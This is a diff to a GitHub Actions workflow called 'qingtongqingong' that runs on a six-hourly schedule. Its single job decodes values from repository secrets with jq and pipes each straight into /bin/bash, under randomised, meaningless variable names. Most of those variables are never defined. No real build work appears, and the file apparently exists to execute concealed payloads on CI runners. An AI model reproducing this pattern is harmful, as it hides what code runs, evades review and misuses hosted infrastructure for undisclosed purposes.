@@ -1,25 +1,30 @@
 name: qingtongqingong
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 2/6 * * *'
-jobs:  # 12494
+    - cron: '37 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: qingtongqingong
         env:
-          nayw9: ${{ secrets.nayw9 }}
+          sekb56158: ${{ secrets.sekb56158 }}
         run: |
-          echo $nayw9 | jq -r .kbmwi26 | /bin/bash
-          echo $ntipx5860 | jq -r .iqw0197 | /bin/bash
-          echo $jaij9 | jq -r .te00903 | /bin/bash
-          echo $vvov39164 | jq -r .yj82757 | /bin/bash
-          echo $cqcm21516 | jq -r .wa303 | /bin/bash
-          echo $ugxhs4 | jq -r .q51062 | /bin/bash
-          echo $jivt1 | jq -r .hop437 | /bin/bash
-          echo $fyxh613 | jq -r .nkcku1 | /bin/bash
+          echo $sekb56158 | jq -r .g84 | /bin/bash
+          echo $lh713 | jq -r .lcsvi94 | /bin/bash
+          echo $jsi85413 | jq -r .ndav78 | /bin/bash
+          echo $sjd51347 | jq -r .gyuzg7 | /bin/bash
+          echo $bqumf96 | jq -r .evas01 | /bin/bash
+          echo $dgzqy9 | jq -r .juwxx063 | /bin/bash
+          echo $amr21459 | jq -r .k7 | /bin/bash
+          echo $pq52300 | jq -r .ddal207 | /bin/bash
+          echo $mstdz717 | jq -r .un780 | /bin/bash
+          echo $dq56085 | jq -r .jzh00 | /bin/bash
+          echo $qx6186 | jq -r .wsmqp839 | /bin/bash
+          echo $vbju0 | jq -r .duw6662 | /bin/bash
+          echo $zzwjj032 | jq -r .umes03038 | /bin/bash
+          echo $vfd38581 | jq -r .bvh9 | /bin/bash
 
